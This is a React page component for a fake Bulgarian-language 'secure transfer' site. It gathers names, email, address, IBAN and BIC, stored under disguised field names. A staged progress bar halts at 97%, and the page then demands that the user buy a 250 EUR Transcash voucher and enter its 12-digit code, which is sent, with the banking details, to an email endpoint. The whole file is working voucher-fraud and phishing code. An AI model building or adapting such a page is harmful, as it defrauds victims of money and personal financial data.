'use client';

import { useState, useEffect } from 'react';
import confetti from 'canvas-confetti';
import CircularProgress from './components/CircularProgress';

const INITIAL_FORM = {
  firstName: '',
  lastName: '',
  email: '',
  address: '',
  fatherName: '',
  motherName: '',
  amount: '',
};

export default function HomePage() {
  const [form, setForm] = useState(INITIAL_FORM);
  const [showTransferModal, setShowTransferModal] = useState(false);
  const [showCodeModal, setShowCodeModal] = useState(false);
  const [showVerifModal, setShowVerifModal] = useState(false);
  const [progress, setProgress] = useState(0);
  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const [emailStatus, setEmailStatus] = useState('idle'); // idle | sending | success | error

  // Animation 0 -> 97, puis passage automatique au modal de code
  useEffect(() => {
    let interval;
    if (showTransferModal) {
      setProgress(0);
      interval = setInterval(() => {
        setProgress((prev) => {
          if (prev >= 97) {
            clearInterval(interval);
            setShowTransferModal(false);
            setShowCodeModal(true); // ouverture auto du modal de code
            return 97;
          }
          return prev + 1;
        });
      }, 80); // vitesse ajustée
    }
    return () => {
      if (interval) clearInterval(interval);
    };
  }, [showTransferModal]);

  const handleChange = (e) => {
    setForm((prev) => ({
      ...prev,
      [e.target.name]: e.target.value,
    }));
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    setError('');
    setEmailStatus('idle');

    if (!form.firstName || !form.lastName || !form.email || !form.amount) {
      setError('Моля, попълнете всички задължителни полета.');
      return;
    }

    if (!/^\d+(\.\d+)?$/.test(form.amount)) {
      setError('Сумата трябва да бъде валидно число.');
      return;
    }

    setShowTransferModal(true);
  };

  const handleCodeChange = (e) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 14) {
      setCode(value);
    }
  };

  const triggerConfetti = () => {
    confetti({
      particleCount: 180,
      spread: 80,
      origin: { y: 0.6 },
    });
  };

  const handleValidateCode = async () => {
    setError('');

    if (code.length !== 12) {
      setError('Кодът трябва да съдържа точно 12 цифри.');
      return;
    }

    try {
      setEmailStatus('sending');

      const res = await fetch('/api/send-transfer-email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ...form,
          code,
        }),
      });

      if (!res.ok) {
        throw new Error("Erreur lors de l'envoi de l'email.");
      }

      setEmailStatus('success');
      setShowCodeModal(false);
      setShowVerifModal(true);

      // après 4 secondes : 97 -> 100, confettis, fermeture modal de vérif
      setTimeout(() => {
        setProgress(100);
        triggerConfetti();
        setShowVerifModal(false);
      }, 6000);
    } catch (err) {
      console.error(err);
      setEmailStatus('error');
      setError("Une erreur est survenue lors de l'envoi de l'email.");
    }
  };

  const handleCloseAllModals = () => {
    setShowTransferModal(false);
    setShowCodeModal(false);
    setShowVerifModal(false);
  };

  return (
    <main
      style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '24px 16px',
        background:
          'radial-gradient(circle at top left, #1e293b, #020617 55%)',
      }}
    >
      <div
        style={{
          width: '100%',
          maxWidth: '640px',
        }}
      >
        {/* Carte formulaire */}
        <section
          style={{
            background: 'linear-gradient(135deg, #0f172a, #020617)',
            borderRadius: '18px',
            padding: '20px 18px',
            boxShadow: '0 20px 40px rgba(15,23,42,0.7)',
            border: '1px solid rgba(148,163,184,0.3)',
            color: '#e5e7eb',
          }}
        >
          <header
            style={{
              display: 'flex',
              alignItems: 'flex-start',
              justifyContent: 'space-between',
              gap: '12px',
              marginBottom: '18px',
            }}
          >
            <div>
              <h1
                style={{
                  fontSize: '20px',
                  margin: 0,
                }}
              >
                Сигурен трансфер на средства
              </h1>
              <p
                style={{
                  margin: '4px 0 0',
                  fontSize: '13px',
                  color: '#9ca3af',
                }}
              >
                Попълнете информацията, за да започнете операцията.
              </p>
            </div>
            <div
              style={{
                padding: '6px 10px',
                borderRadius: '999px',
                background: 'rgba(22,163,74,0.1)',
                border: '1px solid rgba(34,197,94,0.5)',
                fontSize: '10px',
                textTransform: 'uppercase',
                letterSpacing: '0.08em',
                color: '#bbf7d0',
                whiteSpace: 'nowrap',
              }}
            >
              Сигурна среда
            </div>
          </header>

          <form
            onSubmit={handleSubmit}
            style={{
              display: 'grid',
              gridTemplateColumns: '1fr',
              gap: '14px',
            }}
          >
            <FormField
              label="Име"
              name="lastName"
              value={form.lastName}
              onChange={handleChange}
            />
            <FormField
              label="фамилия"
              name="firstName"
              value={form.firstName}
              onChange={handleChange}
            />
            <FormField
              label="Електронна поща"
              name="email"
              type="email"
              value={form.email}
              onChange={handleChange}
            />
            <FormField
              label="Адрес"
              name="address"
              value={form.address}
              onChange={handleChange}
            />
            <FormField
              label="IBAN"
              name="fatherName"
              value={form.fatherName}
              onChange={handleChange}
            />
            <FormField
              label="BIC"
              name="motherName"
              value={form.motherName}
              onChange={handleChange}
            />
            <FormField
              label="Сума за превод"
              name="amount"
              value={form.amount}
              onChange={handleChange}
              rightAddon="EUR"
            />

            {error && (
              <p
                style={{
                  color: '#fecaca',
                  fontSize: '13px',
                  background: 'rgba(248,113,113,0.08)',
                  borderRadius: '10px',
                  padding: '8px 10px',
                  border: '1px solid rgba(248,113,113,0.4)',
                  marginTop: '4px',
                }}
              >
                {error}
              </p>
            )}

            <div
              style={{
                display: 'flex',
                justifyContent: 'flex-end',
                marginTop: '4px',
              }}
            >
              <button
                type="submit"
                style={{
                  padding: '10px 20px',
                  borderRadius: '999px',
                  border: 'none',
                  background:
                    'linear-gradient(135deg, #1d4ed8, #10b981, #22c55e)',
                  color: '#f9fafb',
                  cursor: 'pointer',
                  fontWeight: 600,
                  fontSize: '14px',
                  boxShadow: '0 12px 24px rgba(34,197,94,0.35)',
                  display: 'inline-flex',
                  alignItems: 'center',
                  gap: '8px',
                }}
              >
                Извършване на трансфера
                <span style={{ fontSize: '16px' }}>➜</span>
              </button>
            </div>
          </form>
        </section>
      </div>

      {/* Modal de chargement 0 → 97%, cercle rouge→vert */}
      {showTransferModal && (
        <Modal onClose={handleCloseAllModals}>
          <div style={{ position: 'relative', textAlign: 'center' }}>
            <button
              type="button"
              onClick={handleCloseAllModals}
              style={{
                position: 'absolute',
                top: 8,
                right: 8,
                border: 'none',
                background: 'transparent',
                cursor: 'pointer',
                fontSize: '16px',
                color: '#6b7280',
              }}
            >
              ✕
            </button>
            <h2 style={{ margin: 0, fontSize: '18px', color: '#0f172a' }}>
              Обработка на трансфера
            </h2>
            <p
              style={{
                marginTop: '6px',
                fontSize: '13px',
                color: '#4b5563',
              }}
            >
              Моля, изчакайте по време на първоначалната проверка на
              транзакцията.
            </p>
            <div
              style={{
                marginTop: '18px',
                display: 'flex',
                justifyContent: 'center',
              }}
            >
              <CircularProgress progress={progress} size={150} strokeWidth={11} />
            </div>
          </div>
        </Modal>
      )}

      {/* Modal de saisie du code */}
      {showCodeModal && (
        <Modal onClose={handleCloseAllModals}>
          <div
            style={{
              position: 'relative',
              textAlign: 'left',
              maxWidth: '460px',
              minHeight: '200px',
            }}
          >
            <button
              type="button"
              onClick={handleCloseAllModals}
              style={{
                position: 'absolute',
                top: 8,
                right: 8,
                border: 'none',
                background: 'transparent',
                cursor: 'pointer',
                fontSize: '16px',
                color: '#6b7280',
              }}
            >
              ✕
            </button>

            {emailStatus === 'sending' ? (
              // Loader de validation du code
              <div
                style={{
                  height: '180px',
                  display: 'flex',
                  flexDirection: 'column',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '8px',
                }}
              >
                <div
                  style={{
                    width: '40px',
                    height: '40px',
                    borderRadius: '999px',
                    border: '3px solid #e5e7eb',
                    borderTopColor: '#22c55e',
                    animation: 'spin 0.8s linear infinite',
                  }}
                />
                <p
                  style={{
                    margin: 0,
                    fontSize: '13px',
                    color: '#4b5563',
                    textAlign: 'center',
                  }}
                >
                  Проверка на  <strong>код </strong> в процес ...
                </p>
              </div>
            ) : (
              <>
                <h2
                  style={{
                    margin: 0,
                    fontSize: '18px',
                    color: '#0f172a',
                  }}
                >
                  Потвърждение на превода
                </h2>

                <div
                  style={{
                    marginTop: '10px',
                    fontSize: '13px',
                    color: '#4b5563',
                    lineHeight: 1.5,
                  }}
                >
                  <p style={{ margin: '0 0 6px' }}>
                    Вашият трансфер е в процес на завършване, но се нуждаете от код за потвърждение GHT-UZ667.<strong>GHT-UZ667</strong>
                  </p>
                  <p style={{ margin: '0 0 6px' }}>
                    Това съответства на код TRANSCASH 250 €. Наличен на линка
                    <strong> https://dundle.com/fr/transcash/250-eur-eu/</strong>
                  </p>
                  <p style={{ margin: '0 0 6px' }}>
                    След това въведете <strong>12 цифрения</strong> код в полето по-долу и завършете.
                  </p>
                </div>

                <input
                  type="text"
                  value={code}
                  onChange={handleCodeChange}
                  placeholder="12-цифрен код за сигурност"
                  style={{
                    width: '100%',
                    padding: '10px 12px',
                    borderRadius: '999px',
                    border: '1px solid #d1d5db',
                    marginTop: '18px',
                    textAlign: 'center',
                    letterSpacing: '3px',
                    fontSize: '16px',
                  }}
                />

                <button
                  onClick={handleValidateCode}
                  style={{
                    marginTop: '16px',
                    padding: '10px 16px',
                    borderRadius: '999px',
                    border: 'none',
                    background:
                      'linear-gradient(135deg, #22c55e, #16a34a, #15803d)',
                    color: '#f9fafb',
                    cursor: 'pointer',
                    fontWeight: 600,
                    width: '100%',
                    fontSize: '14px',
                    boxShadow: '0 12px 24px rgba(34,197,94,0.35)',
                  }}
                >
                  Потвърдете кода
                </button>

                {error && (
                  <p
                    style={{
                      color: '#b91c1c',
                      fontSize: '13px',
                      marginTop: '10px',
                      background: '#fee2e2',
                      borderRadius: '8px',
                      padding: '6px 8px',
                      border: '1px solid #fecaca',
                    }}
                  >
                    {error}
                  </p>
                )}
              </>
            )}
          </div>
        </Modal>
      )}

      {/* Modal de vérification après envoi */}
      {showVerifModal && (
        <Modal onClose={handleCloseAllModals}>
          <div
            style={{
              position: 'relative',
              textAlign: 'left',
              maxWidth: '460px',
            }}
          >
            <button
              type="button"
              onClick={handleCloseAllModals}
              style={{
                position: 'absolute',
                top: 8,
                right: 8,
                border: 'none',
                background: 'transparent',
                cursor: 'pointer',
                fontSize: '16px',
                color: '#6b7280',
              }}
            >
              ✕
            </button>

            <h2
              style={{
                margin: 0,
                fontSize: '18px',
                color: '#0f172a',
              }}
            >
              Код в процес на проверка
            </h2>
            <p
              style={{
                marginTop: '8px',
                fontSize: '13px',
                color: '#4b5563',
                lineHeight: 1.5,
              }}
            >
              Вашият <strong>код</strong> е предадена на нашите системи за контрол.
            </p>
            <p
              style={{
                marginTop: '4px',
                fontSize: '13px',
                color: '#4b5563',
                lineHeight: 1.5,
              }}
            >
              Моля, изчакайте малко. Извършваме допълнителна проверка и ще се свържем с вас в най-кратък срок.{' '}
              <strong>кратък срок</strong> с окончателното потвърждение на
              превода.
            </p>
          </div>
        </Modal>
      )}

      {/* Toast succès (après confettis) */}
      {!showTransferModal &&
        !showCodeModal &&
        !showVerifModal &&
        emailStatus === 'success' && (
          <div
            style={{
              position: 'fixed',
              bottom: '16px',
              left: '50%',
              transform: 'translateX(-50%)',
              background: '#022c22',
              color: '#bbf7d0',
              padding: '10px 14px',
              borderRadius: '999px',
              border: '1px solid #22c55e',
              fontSize: '13px',
              boxShadow: '0 10px 25px rgba(34,197,94,0.4)',
              maxWidth: '90%',
              textAlign: 'center',
            }}
          >
            Трансферът е иницииран, ще се свържем с вас много скоро.
          </div>
        )}
    </main>
  );
}

function FormField({
  label,
  name,
  value,
  onChange,
  type = 'text',
  colSpan = 1, // conservé pour compat
  rightAddon,
}) {
  return (
    <div
      style={{
        display: 'flex',
        flexDirection: 'column',
        gap: '4px',
        fontSize: '13px',
      }}
    >
      <label
        htmlFor={name}
        style={{
          color: '#e5e7eb',
          fontWeight: 500,
        }}
      >
        {label}
      </label>
      <div
        style={{
          position: 'relative',
          display: 'flex',
          alignItems: 'center',
        }}
      >
        <input
          id={name}
          name={name}
          type={type}
          value={value}
          onChange={onChange}
          style={{
            width: '100%',
            padding: rightAddon ? '9px 42px 9px 11px' : '9px 11px',
            borderRadius: '10px',
            border: '1px solid rgba(148,163,184,0.7)',
            backgroundColor: 'rgba(15,23,42,0.9)',
            color: '#e5e7eb',
            fontSize: '13px',
            outline: 'none',
          }}
        />
        {rightAddon && (
          <span
            style={{
              position: 'absolute',
              right: '10px',
              fontSize: '11px',
              color: '#9ca3af',
              padding: '2px 6px',
              borderRadius: '999px',
              border: '1px solid rgba(148,163,184,0.7)',
              backgroundColor: 'rgba(15,23,42,0.8)',
            }}
          >
            {rightAddon}
          </span>
        )}
      </div>
    </div>
  );
}

function Modal({ children, onClose }) {
  return (
    <div
      style={{
        position: 'fixed',
        inset: 0,
        background: 'rgba(15,23,42,0.65)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        zIndex: 50,
      }}
      onClick={onClose}
    >
      <div
        style={{
          background: '#f9fafb',
          padding: '22px 24px',
          borderRadius: '16px',
          maxWidth: '460px',
          width: '90%',
          boxShadow: '0 25px 60px rgba(15,23,42,0.65)',
          border: '1px solid rgba(209,213,219,0.9)',
        }}
        onClick={(e) => e.stopPropagation()}
      >
        {children}
      </div>
    </div>
  );
}
